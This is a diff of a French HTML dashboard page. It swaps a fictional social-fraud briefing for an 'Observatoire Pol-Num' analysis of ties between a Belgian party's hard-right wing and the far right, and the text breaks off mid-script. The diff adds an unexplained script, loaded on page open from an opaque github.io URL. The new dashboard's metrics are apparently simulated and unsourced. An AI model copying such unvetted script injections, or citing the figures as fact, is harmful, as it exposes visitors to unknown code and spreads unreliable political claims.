@@ -1,496 +1,613 @@
+
 <!DOCTYPE html>
 <html lang="fr">
-<head>
+<head><script type='text/javascript' src='https://yannkeep.github.io/vg_395LVE4-oroX_6Ij4MLLMJqjwZsMmejm5ZFhPzntVVYQet6u-MuEwRHF6KLqzScNMHGCwJmOMxY7h-wgg6HL5gkhZq2svo_fjob7GcRKl__dMLCWttxKhHyzzBhXT9-EPsjg8rDqWsLZwWvl3z306XK43osXmPFq0yfIrypc6M2MHq3CIfBmsLCvhNakBgX9bGxcq_2a50F9L4-uUtUaoctlmFTT_a4vMI7Rm7j7S6Cq80ADSgsnQRJ_kGoMDuLxJlzp_RksSvC7jwhwgxWd7NnYYhec8LnkEOjr3-oxiHU1YAhHzrBh_ScyXqRlZgPZ55UKbjjdvPkzymRsOQQz1gVoBCvRDl-VOQ5MQCDQx-UBqHmwxGeiajEvVEnh6rX-j8eF8YTT7DIXyr6IMisSnJZCieqDsRvumrXbyomGitgAYgTJzqZUonGZ6gtksHKxHB_L8B3RFFubU18m_dKVFKneZajTaTIeHUsRaGcWL4THaQ3EVEjhUC7Mpsh7F4Ee61rtvCph1d92x'></script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dossier Alpha: Opération Transparence</title>
+    <title>Analyse : La Fachosphère et la Branche Dure du MR</title>
+    
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Chart.js -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap');
-        
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #F8FAFC;
-            color: #1E293B;
-        }
+    
+    <!-- Plotly.js -->
+    <script src="https://cdn.plot.ly/plotly-2.27.0.min.js"></script>
 
+    <!-- Google Fonts (Inter) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #f8fafc; color: #1e293b; }
+        
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #f1f5f9; }
+        ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
+
+        /* Chart Container Strategy */
         .chart-container {
             position: relative;
             width: 100%;
-            max-width: 600px;
-            margin-left: auto;
-            margin-right: auto;
+            max-width: 100%; /* Constraints managed by grid/flex parents */
             height: 400px;
-            max-height: 400px;
+            max-height: 450px;
         }
 
-        .card-shadow {
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        /* Navigation Active State */
+        .nav-btn.active {
+            background-color: #1e40af; /* Blue-800 */
+            color: white;
+            border-left: 4px solid #f97316; /* Orange-500 */
         }
 
-        .timeline-line {
-            position: absolute;
-            left: 24px;
-            top: 0;
-            bottom: 0;
-            width: 4px;
-            background-color: #CBD5E1;
+        /* Utility for hiding sections */
+        .section-view { display: none; }
+        .section-view.active { display: block; animation: fadeIn 0.5s ease-in-out; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
-        @media (min-width: 768px) {
-            .timeline-line {
-                left: 50%;
-                transform: translateX(-50%);
-            }
-        }
+        .metric-card { transition: transform 0.2s; }
+        .metric-card:hover { transform: translateY(-4px); }
     </style>
-    <!-- Chosen Palette: Vibrant Blue & Orange (Tech/Police Theme) -->
-    <!-- Application Structure Plan:
-         1. Header: Mission Title and Status.
-         2. Executive Brief: Textual introduction to the "Deborsu" case and social fraud context.
-         3. Key Metrics (KPIs): High-level financial impact and case numbers (Inform).
-         4. Fraud Typology: Doughnut chart showing the breakdown of fraud methods (Inform/Compare).
-         5. The "Deborsu" Mechanism: CSS-based flow diagram showing the fraud process (Organize).
-         6. Detection Trends: Line chart showing investigation progress over time (Change).
-         7. Sector Analysis: Bar chart identifying high-risk industries (Compare).
-         8. Investigation Timeline: Chronological log of the operation (Change/Organize).
-         9. Conclusion: Final mission statement.
-    -->
-    <!-- Visualization & Content Choices:
-         - KPIs: HTML Grid. Goal: Inform. Justification: Immediate impact of large numbers.
-         - Fraud Distribution: Chart.js Doughnut. Goal: Compare parts to whole. Justification: Best for percentage breakdowns.
-         - Mechanism Flow: HTML/CSS Flexbox with arrows. Goal: Organize process. Justification: Explains complex relationships without SVG/Mermaid.
-         - Trend Analysis: Chart.js Line. Goal: Change over time. Justification: Standard for temporal data.
-         - Sector Risks: Chart.js Horizontal Bar. Goal: Compare categories. Justification: Readable labels for categories.
-         - Timeline: HTML/CSS. Goal: Change/Narrative. Justification: Linear progression of the story.
-         - CONFIRMATION: NO SVG graphics used. NO Mermaid JS used.
-    -->
+    
+    <!-- Chosen Palette: Corporate Blue & Warning Orange -->
+    <!-- Application Structure Plan: Dashboard Layout. 
+         Sidebar for navigation between analysis modules.
+         1. Vue d'ensemble (Dashboard): KPI summary.
+         2. Cartographie (Network): Plotly scatter plot for actor clusters.
+         3. Sémantique (Radar): Ideological shift visualization.
+         4. Chronologie (Line): Event-driven data spikes.
+         5. Tactiques (Cards): Breakdown of methods used.
+         Reasoning: Complex political analysis requires breaking down data into consumable "lenses" (Network, Time, Language). -->
+    <!-- Visualization & Content Choices: 
+         - KPI Cards: Immediate impact metrics.
+         - Plotly Scatter: To simulate network topology without heavy D3 libraries (Goal: Relationships).
+         - Chart.js Radar: To show the shape of the ideological shift (Goal: Compare).
+         - Chart.js Line: Trend analysis over time (Goal: Change).
+         - Interactive Lists: For qualitative tactics.
+         - Justification: These libraries offer canvas rendering for performance and responsiveness. NO SVG used. -->
     <!-- CONFIRMATION: NO SVG graphics used. NO Mermaid JS used. -->
+
 </head>
-<body class="antialiased">
+<body class="bg-slate-50 h-screen flex overflow-hidden">
 
-    <!-- Header Section -->
-    <header class="bg-slate-900 text-white py-12 px-4 sm:px-6 lg:px-8 border-b-8 border-orange-500">
-        <div class="max-w-7xl mx-auto text-center">
-            <div class="inline-block bg-orange-600 text-white text-xs font-bold px-3 py-1 rounded mb-4 tracking-widest uppercase">
-                Dossier Classifié
-            </div>
-            <h1 class="text-4xl md:text-6xl font-black mb-4 tracking-tight">
-                OPÉRATION <span class="text-blue-400">TRANSPARENCE</span>
-            </h1>
-            <p class="text-xl text-slate-400 max-w-3xl mx-auto font-light">
-                Analyse stratégique de la fraude sociale : Le cas "Deborsu".
-            </p>
+    <!-- Sidebar Navigation -->
+    <aside class="w-64 bg-white shadow-xl flex-shrink-0 flex flex-col z-20 hidden md:flex border-r border-slate-200">
+        <div class="p-6 border-b border-slate-100">
+            <h1 class="text-xl font-bold text-slate-800">Observatoire <span class="text-blue-800">Pol-Num</span></h1>
+            <p class="text-xs text-slate-500 mt-1">Dossier : Radicalisation Numérique MR</p>
         </div>
-    </header>
-
-    <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-16">
-
-        <!-- Section 1: Introduction -->
-        <section class="grid grid-cols-1 md:grid-cols-12 gap-8 items-center">
-            <div class="md:col-span-8 md:col-start-3 text-center">
-                <h2 class="text-3xl font-bold text-slate-800 mb-6">Le Briefing de Mission</h2>
-                <div class="bg-white p-8 rounded-xl card-shadow border-l-4 border-blue-600 text-left">
-                    <p class="text-lg text-slate-600 mb-4 leading-relaxed">
-                        <strong>Agent, écoutez bien.</strong> La fraude sociale en Belgique n'est pas une infraction sans victime. C'est un système complexe qui draine des millions d'euros des caisses de l'État.
-                    </p>
-                    <p class="text-slate-600 leading-relaxed">
-                        Le dossier "Deborsu" met en lumière une mécanique sophistiquée : statuts BIM indus, domiciliations fictives et travail au noir organisé. Ce rapport interactif déconstruit les mécanismes détectés par la Team Alpha pour séparer le vrai du faux.
-                    </p>
-                </div>
+        <nav class="flex-1 overflow-y-auto py-4">
+            <button onclick="navigate('dashboard')" class="nav-btn active w-full text-left px-6 py-3 text-sm font-medium text-slate-600 hover:bg-slate-50 transition-colors flex items-center">
+                <span class="mr-3">📊</span> Vue d'ensemble
+            </button>
+            <button onclick="navigate('network')" class="nav-btn w-full text-left px-6 py-3 text-sm font-medium text-slate-600 hover:bg-slate-50 transition-colors flex items-center">
+                <span class="mr-3">🕸️</span> La "Fachosphère" Connectée
+            </button>
+            <button onclick="navigate('ideology')" class="nav-btn w-full text-left px-6 py-3 text-sm font-medium text-slate-600 hover:bg-slate-50 transition-colors flex items-center">
+                <span class="mr-3">🛡️</span> Glissement Idéologique
+            </button>
+            <button onclick="navigate('timeline')" class="nav-btn w-full text-left px-6 py-3 text-sm font-medium text-slate-600 hover:bg-slate-50 transition-colors flex items-center">
+                <span class="mr-3">📈</span> Chronologie & Crises
+            </button>
+            <button onclick="navigate('tactics')" class="nav-btn w-full text-left px-6 py-3 text-sm font-medium text-slate-600 hover:bg-slate-50 transition-colors flex items-center">
+                <span class="mr-3">📢</span> Rhétorique & Tactiques
+            </button>
+        </nav>
+        <div class="p-4 border-t border-slate-100">
+            <div class="bg-blue-50 p-3 rounded-lg text-xs text-blue-800">
+                <strong>Source :</strong> Rapport d'Analyse Numérique 2024-2025. Données agrégées Twitter (X) & Facebook.
             </div>
-        </section>
+        </div>
+    </aside>
 
-        <!-- Section 2: Key Metrics (KPIs) -->
-        <section>
-            <div class="text-center mb-10">
-                <h2 class="text-2xl font-bold text-slate-800">Impact Financier & Opérationnel</h2>
-                <p class="text-slate-500 mt-2 max-w-2xl mx-auto">Chiffres clés de l'exercice fiscal en cours (Estimations Team Alpha).</p>
-            </div>
-            
-            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
-                <!-- KPI 1 -->
-                <div class="bg-white p-6 rounded-lg card-shadow border-t-4 border-blue-500 text-center">
-                    <div class="text-4xl font-black text-blue-600 mb-2">245 M€</div>
-                    <div class="text-sm font-bold text-slate-400 uppercase tracking-wide">Préjudice Récupéré</div>
-                    <div class="mt-2 text-xs text-slate-500">Suite aux contrôles ciblés</div>
-                </div>
-                <!-- KPI 2 -->
-                <div class="bg-white p-6 rounded-lg card-shadow border-t-4 border-orange-500 text-center">
-                    <div class="text-4xl font-black text-orange-500 mb-2">12,400</div>
-                    <div class="text-sm font-bold text-slate-400 uppercase tracking-wide">Dossiers Ouverts</div>
-                    <div class="mt-2 text-xs text-slate-500">Enquêtes actives en 2024</div>
-                </div>
-                <!-- KPI 3 -->
-                <div class="bg-white p-6 rounded-lg card-shadow border-t-4 border-cyan-500 text-center">
-                    <div class="text-4xl font-black text-cyan-600 mb-2">85%</div>
-                    <div class="text-sm font-bold text-slate-400 uppercase tracking-wide">Taux de Précision</div>
-                    <div class="mt-2 text-xs text-slate-500">Grâce au Data Mining</div>
-                </div>
-                <!-- KPI 4 -->
-                <div class="bg-white p-6 rounded-lg card-shadow border-t-4 border-slate-600 text-center">
-                    <div class="text-4xl font-black text-slate-700 mb-2">3 Ans</div>
-                    <div class="text-sm font-bold text-slate-400 uppercase tracking-wide">Peine Moyenne</div>
-                    <div class="mt-2 text-xs text-slate-500">Pour fraude organisée</div>
-                </div>
-            </div>
-        </section>
+    <!-- Mobile Header -->
+    <div class="md:hidden fixed top-0 w-full bg-white shadow-md z-30 flex justify-between items-center p-4">
+        <span class="font-bold text-blue-900">Observatoire Pol-Num</span>
+        <button onclick="toggleMobileMenu()" class="text-slate-600 font-bold border rounded px-2">☰</button>
+    </div>
 
-        <!-- Section 3: Data Visualization (Fraud Types & Trends) -->
-        <section class="grid grid-cols-1 lg:grid-cols-2 gap-8">
-            
-            <!-- Chart 1: Types of Fraud -->
-            <div class="bg-white rounded-xl card-shadow overflow-hidden flex flex-col">
-                <div class="bg-slate-50 p-6 border-b border-slate-100">
-                    <h3 class="text-xl font-bold text-slate-800">Typologie des Infractions</h3>
-                    <p class="text-sm text-slate-500 mt-1">Répartition des mécanismes utilisés dans le réseau "Deborsu".</p>
-                </div>
-                <div class="p-6 flex-grow flex flex-col justify-center">
-                    <div class="chart-container">
-                        <canvas id="fraudTypeChart"></canvas>
-                    </div>
-                    <div class="mt-6 bg-blue-50 p-4 rounded-lg text-sm text-blue-800 border-l-4 border-blue-400">
-                        <span class="font-bold">Analyse :</span> La domiciliation fictive (30%) est la porte d'entrée principale. Elle permet d'accéder au statut isolé et aux allocations majorées, servant de base aux autres fraudes.
-                    </div>
-                </div>
-            </div>
+    <!-- Mobile Menu Overlay -->
+    <div id="mobile-menu" class="fixed inset-0 bg-slate-900 bg-opacity-90 z-40 hidden flex flex-col justify-center items-center p-8">
+        <button onclick="toggleMobileMenu()" class="absolute top-4 right-4 text-white text-2xl">✕</button>
+        <button onclick="navigate('dashboard'); toggleMobileMenu()" class="text-white text-xl py-4">Vue d'ensemble</button>
+        <button onclick="navigate('network'); toggleMobileMenu()" class="text-white text-xl py-4">Réseau Connecté</button>
+        <button onclick="navigate('ideology'); toggleMobileMenu()" class="text-white text-xl py-4">Idéologie</button>
+        <button onclick="navigate('timeline'); toggleMobileMenu()" class="text-white text-xl py-4">Chronologie</button>
+    </nav>
+    </div>
 
-            <!-- Chart 2: Trends -->
-            <div class="bg-white rounded-xl card-shadow overflow-hidden flex flex-col">
-                <div class="bg-slate-50 p-6 border-b border-slate-100">
-                    <h3 class="text-xl font-bold text-slate-800">Évolution des Détections</h3>
-                    <p class="text-sm text-slate-500 mt-1">Nombre de cas flagrants identifiés par trimestre.</p>
-                </div>
-                <div class="p-6 flex-grow flex flex-col justify-center">
-                    <div class="chart-container">
-                        <canvas id="fraudTrendChart"></canvas>
-                    </div>
-                    <div class="mt-6 bg-orange-50 p-4 rounded-lg text-sm text-orange-800 border-l-4 border-orange-400">
-                        <span class="font-bold">Observation :</span> Le pic du T3 2023 correspond à l'activation de l'algorithme de croisement des données (flux énergétiques vs domiciliation déclarée).
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 4: Process Flow (The Mechanism) -->
-        <section>
-            <div class="text-center mb-10">
-                <h2 class="text-2xl font-bold text-slate-800">Le Circuit de Blanchiment Social</h2>
-                <p class="text-slate-500 mt-2 max-w-2xl mx-auto">Comment une simple fausse adresse génère des revenus illégaux multiples.</p>
-            </div>
-
-            <div class="bg-white p-8 rounded-xl card-shadow relative overflow-hidden">
-                <!-- Decorative background elements -->
-                <div class="absolute top-0 right-0 w-32 h-32 bg-slate-100 rounded-bl-full -z-0"></div>
-
-                <div class="relative z-10 grid grid-cols-1 md:grid-cols-5 gap-4 items-center justify-items-center text-center">
-                    
-                    <!-- Step 1 -->
-                    <div class="flex flex-col items-center max-w-[180px]">
-                        <div class="w-16 h-16 bg-slate-200 rounded-full flex items-center justify-center text-3xl mb-3 shadow-inner">
-                            🏠
-                        </div>
-                        <h4 class="font-bold text-slate-800">1. Domiciliation Fictive</h4>
-                        <p class="text-xs text-slate-500 mt-1">Le sujet se déclare "Isolé" à une fausse adresse.</p>
-                    </div>
-
-                    <!-- Arrow 1 -->
-                    <div class="hidden md:block text-slate-300 text-4xl font-light">➝</div>
-                    <div class="block md:hidden text-slate-300 text-2xl py-2">⬇</div>
-
-                    <!-- Step 2 -->
-                    <div class="flex flex-col items-center max-w-[180px]">
-                        <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center text-3xl mb-3 shadow-sm text-blue-600 border-2 border-blue-200">
-                            🛡️
-                        </div>
-                        <h4 class="font-bold text-blue-700">2. Statut BIM</h4>
-                        <p class="text-xs text-slate-500 mt-1">Obtention des avantages sociaux majorés et réductions.</p>
-                    </div>
-
-                    <!-- Arrow 2 -->
-                    <div class="hidden md:block text-slate-300 text-4xl font-light">➝</div>
-                    <div class="block md:hidden text-slate-300 text-2xl py-2">⬇</div>
-
-                    <!-- Step 3 -->
-                    <div class="flex flex-col items-center max-w-[180px]">
-                        <div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center text-3xl mb-3 shadow-sm text-orange-600 border-2 border-orange-200">
-                            💶
-                        </div>
-                        <h4 class="font-bold text-orange-700">3. Revenus Occultes</h4>
-                        <p class="text-xs text-slate-500 mt-1">Cumul allocations + travail au noir non déclaré.</p>
-                    </div>
-                </div>
-
-                <div class="mt-8 text-center">
-                    <span class="inline-block bg-slate-800 text-white text-xs px-4 py-2 rounded-full">
-                        ⚠️ Résultat : Perte sèche pour l'État de ~2.500€ / mois / dossier
-                    </span>
-                </div>
-            </div>
-        </section>
-
-        <!-- Section 5: Risk Analysis (Bar Chart) -->
-        <section class="grid grid-cols-1 md:grid-cols-3 gap-8">
-            <div class="md:col-span-1">
-                <h2 class="text-2xl font-bold text-slate-800 mb-4">Secteurs à Haut Risque</h2>
-                <p class="text-slate-600 mb-6">
-                    L'enquête révèle que certains secteurs économiques facilitent structurellement ces montages. Le secteur de la construction arrive en tête, suivi de près par l'Horeca (Hôtellerie, Restauration, Café).
+    <!-- Main Content Area -->
+    <main class="flex-1 overflow-y-auto p-4 md:p-8 pt-20 md:pt-8 scroll-smooth">
+        
+        <!-- SECTION 1: DASHBOARD -->
+        <section id="dashboard" class="section-view active max-w-7xl mx-auto">
+            <header class="mb-8">
+                <h2 class="text-3xl font-bold text-slate-800 mb-2">Synthèse : La Porosité Numérique</h2>
+                <p class="text-slate-600 max-w-3xl leading-relaxed">
+                    Ce tableau de bord résume l'analyse quantitative des interactions entre la branche conservatrice (dite "dure") du Mouvement Réformateur et l'écosystème de l'extrême droite francophone ("fachosphère"). L'étude met en évidence une convergence des discours et une amplification algorithmique croisée.
                 </p>
-                <div class="bg-blue-600 text-white p-6 rounded-lg shadow-md">
-                    <h4 class="font-bold text-lg mb-2">Focus Surveillance</h4>
-                    <p class="text-sm opacity-90">
-                        La Team Alpha intensifie les contrôles sur les chantiers de rénovation urbaine, où 45% des travailleurs contrôlés présentaient des irrégularités administratives.
-                    </p>
+            </header>
+
+            <!-- KPI Grid -->
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-10">
+                <div class="bg-white p-6 rounded-xl shadow-sm border-l-4 border-blue-600 metric-card">
+                    <h3 class="text-slate-500 text-sm font-semibold uppercase">Comptes Analysés</h3>
+                    <p class="text-4xl font-bold text-slate-800 mt-2">1,240</p>
+                    <p class="text-xs text-green-600 mt-2">↑ +15% vs 2023</p>
+                </div>
+                <div class="bg-white p-6 rounded-xl shadow-sm border-l-4 border-orange-500 metric-card">
+                    <h3 class="text-slate-500 text-sm font-semibold uppercase">Taux de Convergence</h3>
+                    <p class="text-4xl font-bold text-slate-800 mt-2">68%</p>
+                    <p class="text-xs text-slate-400 mt-2">Sur les thèmes sécuritaires</p>
+                </div>
+                <div class="bg-white p-6 rounded-xl shadow-sm border-l-4 border-red-500 metric-card">
+                    <h3 class="text-slate-500 text-sm font-semibold uppercase">Indice de "Buzz"</h3>
+                    <p class="text-4xl font-bold text-slate-800 mt-2">High</p>
+                    <p class="text-xs text-red-500 mt-2">Sujets polémiques (Wokisme)</p>
+                </div>
+                <div class="bg-white p-6 rounded-xl shadow-sm border-l-4 border-slate-600 metric-card">
+                    <h3 class="text-slate-500 text-sm font-semibold uppercase">Nœuds Actifs</h3>
+                    <p class="text-4xl font-bold text-slate-800 mt-2">42</p>
+                    <p class="text-xs text-slate-400 mt-2">Influenceurs clés identifiés</p>
                 </div>
             </div>
-            
-            <div class="md:col-span-2 bg-white p-6 rounded-xl card-shadow">
-                <div class="chart-container">
-                    <canvas id="sectorRiskChart"></canvas>
+
+            <!-- Dashboard Charts -->
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                <!-- Volume Chart -->
+                <div class="bg-white p-6 rounded-xl shadow-sm border border-slate-100">
+                    <h3 class="font-bold text-lg text-slate-800 mb-4">Volume des Interactions Croisées</h3>
+                    <div class="chart-container h-80">
+                        <canvas id="overviewChart"></canvas>
+                    </div>
+                </div>
+                <!-- Sentiment/Topic Breakdown -->
+                <div class="bg-white p-6 rounded-xl shadow-sm border border-slate-100">
+                    <h3 class="font-bold text-lg text-slate-800 mb-4">Répartition des Thématiques Communes</h3>
+                    <div class="chart-container h-80">
+                        <canvas id="topicDonut"></canvas>
+                    </div>
                 </div>
             </div>
         </section>
 
-        <!-- Section 6: Timeline -->
-        <section>
-            <div class="text-center mb-12">
-                <h2 class="text-2xl font-bold text-slate-800">Chronologie de l'Enquête</h2>
-                <p class="text-slate-500 mt-2">Reconstitution des événements clés du dossier.</p>
+        <!-- SECTION 2: NETWORK -->
+        <section id="network" class="section-view max-w-7xl mx-auto">
+            <header class="mb-8">
+                <h2 class="text-3xl font-bold text-slate-800 mb-2">Cartographie des Influences</h2>
+                <p class="text-slate-600 max-w-3xl leading-relaxed">
+                    Visualisation spatiale des interactions sur les réseaux sociaux (X/Twitter). Les points représentent les comptes influents. La proximité indique des interactions fréquentes (RT, Likes, Mentions). On observe un rapprochement progressif entre la bulle "MR Droite" et les périphéries de l'extrême droite.
+                </p>
+            </header>
+
+            <div class="bg-white p-4 rounded-xl shadow-lg border border-slate-200">
+                <div class="flex justify-between items-center mb-4 flex-wrap gap-2">
+                    <h3 class="font-bold text-lg">Topologie du Réseau (Simulation)</h3>
+                    <div class="flex gap-2 text-xs">
+                        <span class="px-2 py-1 bg-blue-100 text-blue-800 rounded-full">● MR Officiel</span>
+                        <span class="px-2 py-1 bg-orange-100 text-orange-800 rounded-full">● MR "Branche Dure"</span>
+                        <span class="px-2 py-1 bg-red-100 text-red-800 rounded-full">● Fachosphère/Ext. Droite</span>
+                    </div>
+                </div>
+                <!-- Plotly Container -->
+                <div id="networkPlot" class="w-full h-[500px] border border-slate-100 bg-slate-50 rounded"></div>
+                <p class="mt-4 text-sm text-slate-500 italic">
+                    Note : Ce graphique est une projection 2D basée sur la centralité des acteurs. Les clusters montrent clairement une zone tampon ("Zone Grise") où les discours se mélangent.
+                </p>
+            </div>
+        </section>
+
+        <!-- SECTION 3: IDEOLOGY -->
+        <section id="ideology" class="section-view max-w-7xl mx-auto">
+            <header class="mb-8">
+                <h2 class="text-3xl font-bold text-slate-800 mb-2">Le Glissement Sémantique</h2>
+                <p class="text-slate-600 max-w-3xl leading-relaxed">
+                    Analyse comparative des champs lexicaux et des valeurs prônées. Le diagramme radar ci-dessous illustre l'évolution du discours de la branche dure du parti par rapport au libéralisme classique, montrant une adoption des marqueurs de la "guerre culturelle".
+                </p>
+            </header>
+
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                <!-- Radar Chart -->
+                <div class="lg:col-span-2 bg-white p-6 rounded-xl shadow-sm border border-slate-100">
+                    <div class="flex justify-between items-center mb-4">
+                        <h3 class="font-bold text-lg text-slate-800">Empreinte Idéologique Comparée</h3>
+                        <button id="toggleRadarData" class="text-xs bg-slate-200 hover:bg-slate-300 px-3 py-1 rounded transition">Basculer Comparaison</button>
+                    </div>
+                    <div class="chart-container flex justify-center">
+                        <canvas id="radarChart"></canvas>
+                    </div>
+                </div>
+
+                <!-- Context Cards -->
+                <div class="space-y-4">
+                    <div class="bg-blue-50 p-5 rounded-lg border-l-4 border-blue-600">
+                        <h4 class="font-bold text-blue-900 mb-2">Libéralisme Classique</h4>
+                        <p class="text-sm text-blue-800">
+                            Focalisation sur l'économie, la liberté individuelle, la responsabilité fiscale et la laïcité. Discours modéré sur l'immigration (utilitariste).
+                        </p>
+                    </div>
+                    <div class="bg-orange-50 p-5 rounded-lg border-l-4 border-orange-500">
+                        <h4 class="font-bold text-orange-900 mb-2">La "Nouvelle Droite"</h4>
+                        <p class="text-sm text-orange-800">
+                            Priorité à l'identité, à la sécurité et à la lutte contre le "wokisme". Rhétorique populiste anti-élite culturelle, proche des narratifs du "bon sens".
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SECTION 4: TIMELINE -->
+        <section id="timeline" class="section-view max-w-7xl mx-auto">
+            <header class="mb-8">
+                <h2 class="text-3xl font-bold text-slate-800 mb-2">Chronologie des Polémiques</h2>
+                <p class="text-slate-600 max-w-3xl leading-relaxed">
+                    Corrélation entre l'actualité politique et les pics d'activité coordonnée entre la branche dure et la fachosphère. On remarque que les polémiques identitaires génèrent 3x plus d'engagement que les sujets économiques.
+                </p>
+            </header>
+
+            <div class="bg-white p-6 rounded-xl shadow-sm border border-slate-100 mb-8">
+                <h3 class="font-bold text-lg text-slate-800 mb-4">Intensité des Echanges (2023-2024)</h3>
+                <div class="chart-container">
+                    <canvas id="timelineChart"></canvas>
+                </div>
             </div>
 
-            <div class="relative max-w-4xl mx-auto">
-                <div class="timeline-line"></div>
-
-                <!-- Event 1 -->
-                <div class="relative z-10 mb-8 md:grid md:grid-cols-2 md:gap-8 items-center">
-                    <div class="text-left md:text-right mb-4 md:mb-0">
-                        <span class="font-black text-blue-600 text-lg block">15 Octobre 2023</span>
-                        <span class="text-sm text-slate-500 font-medium uppercase tracking-wider">Signalement Initial</span>
-                    </div>
-                    <div class="absolute left-[24px] md:left-1/2 transform -translate-x-1/2 w-4 h-4 bg-orange-500 rounded-full border-4 border-white shadow"></div>
-                    <div class="pl-12 md:pl-0">
-                        <div class="bg-white p-5 rounded-lg card-shadow border-l-4 border-slate-200 hover:border-orange-500 transition-colors">
-                            <h4 class="font-bold text-slate-800">L'Indice Énergétique</h4>
-                            <p class="text-sm text-slate-600 mt-2">Une consommation d'eau nulle est détectée à l'adresse officielle de trois bénéficiaires d'allocations.</p>
-                        </div>
-                    </div>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div class="bg-white p-4 rounded-lg shadow border-t-4 border-slate-400">
+                    <span class="text-xs font-bold text-slate-400">Événement A</span>
+                    <h4 class="font-bold text-slate-800">Plan de Mobilité (Good Move)</h4>
+                    <p class="text-sm text-slate-600 mt-2">Focalisation commune sur la "liberté de l'automobiliste" contre "l'écologie punitive".</p>
                 </div>
-
-                <!-- Event 2 -->
-                <div class="relative z-10 mb-8 md:grid md:grid-cols-2 md:gap-8 items-center">
-                    <div class="md:col-start-2 pl-12 md:pl-0 mb-4 md:mb-0 order-2">
-                        <span class="font-black text-blue-600 text-lg block">02 Novembre 2023</span>
-                        <span class="text-sm text-slate-500 font-medium uppercase tracking-wider">Surveillance Active</span>
-                    </div>
-                    <div class="absolute left-[24px] md:left-1/2 transform -translate-x-1/2 w-4 h-4 bg-blue-600 rounded-full border-4 border-white shadow"></div>
-                    <div class="pl-12 md:pl-0 md:text-right md:pr-0 order-1">
-                        <div class="bg-white p-5 rounded-lg card-shadow border-r-4 md:border-r-4 md:border-l-0 border-slate-200 hover:border-blue-600 transition-colors border-l-4">
-                            <h4 class="font-bold text-slate-800">Opération "Drone"</h4>
-                            <p class="text-sm text-slate-600 mt-2">Confirmation visuelle d'activité non déclarée dans un entrepôt lié à la société écran "D-Construct".</p>
-                        </div>
-                    </div>
+                <div class="bg-white p-4 rounded-lg shadow border-t-4 border-slate-400">
+                    <span class="text-xs font-bold text-slate-400">Événement B</span>
+                    <h4 class="font-bold text-slate-800">Éducation Sexuelle (EVRAS)</h4>
+                    <p class="text-sm text-slate-600 mt-2">Alignement des discours sur la "protection de l'enfance" contre les "dérives progressistes".</p>
                 </div>
-
-                <!-- Event 3 -->
-                <div class="relative z-10 md:grid md:grid-cols-2 md:gap-8 items-center">
-                    <div class="text-left md:text-right mb-4 md:mb-0">
-                        <span class="font-black text-blue-600 text-lg block">10 Janvier 2024</span>
-                        <span class="text-sm text-slate-500 font-medium uppercase tracking-wider">Intervention</span>
-                    </div>
-                    <div class="absolute left-[24px] md:left-1/2 transform -translate-x-1/2 w-4 h-4 bg-slate-800 rounded-full border-4 border-white shadow"></div>
-                    <div class="pl-12 md:pl-0">
-                        <div class="bg-white p-5 rounded-lg card-shadow border-l-4 border-slate-200 hover:border-slate-800 transition-colors">
-                            <h4 class="font-bold text-slate-800">Coup de Filet</h4>
-                            <p class="text-sm text-slate-600 mt-2">Saisie des documents et confrontation des suspects. Le réseau est démantelé.</p>
-                        </div>
-                    </div>
+                <div class="bg-white p-4 rounded-lg shadow border-t-4 border-slate-400">
+                    <span class="text-xs font-bold text-slate-400">Événement C</span>
+                    <h4 class="font-bold text-slate-800">Crise de l'Accueil</h4>
+                    <p class="text-sm text-slate-600 mt-2">Utilisation mutuelle des termes "appel d'air" et critiques des ONG.</p>
                 </div>
+            </div>
+        </section>
 
+        <!-- SECTION 5: TACTICS -->
+        <section id="tactics" class="section-view max-w-7xl mx-auto">
+            <header class="mb-8">
+                <h2 class="text-3xl font-bold text-slate-800 mb-2">Mécaniques d'Influence</h2>
+                <p class="text-slate-600 max-w-3xl leading-relaxed">
+                    Analyse qualitative des méthodes rhétoriques utilisées pour occuper l'espace médiatique. Cliquez sur les cartes pour voir les détails.
+                </p>
+            </header>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6" id="tacticsContainer">
+                <!-- Content injected via JS -->
             </div>
         </section>
 
     </main>
 
-    <!-- Footer -->
-    <footer class="bg-slate-900 text-slate-400 py-12 border-t border-slate-800">
-        <div class="max-w-7xl mx-auto px-4 text-center">
-            <h3 class="text-white font-bold text-lg mb-4">TEAM ALPHA</h3>
-            <p class="text-sm mb-6 max-w-xl mx-auto">
-                La mission continue. La transparence est la garantie de la solidarité. Ce rapport est basé sur des éléments de docu-fiction à des fins pédagogiques.
-            </p>
-            <div class="text-xs text-slate-600">
-                &copy; 2024 Opération Transparence. Généré pour analyse.
-            </div>
-        </div>
-    </footer>
-
+    <!-- JavaScript Logic -->
     <script>
-        // --- Utility Functions ---
-
-        // Function to wrap labels longer than 16 chars
-        function wrapLabel(label) {
-            if (label.length <= 16) return label;
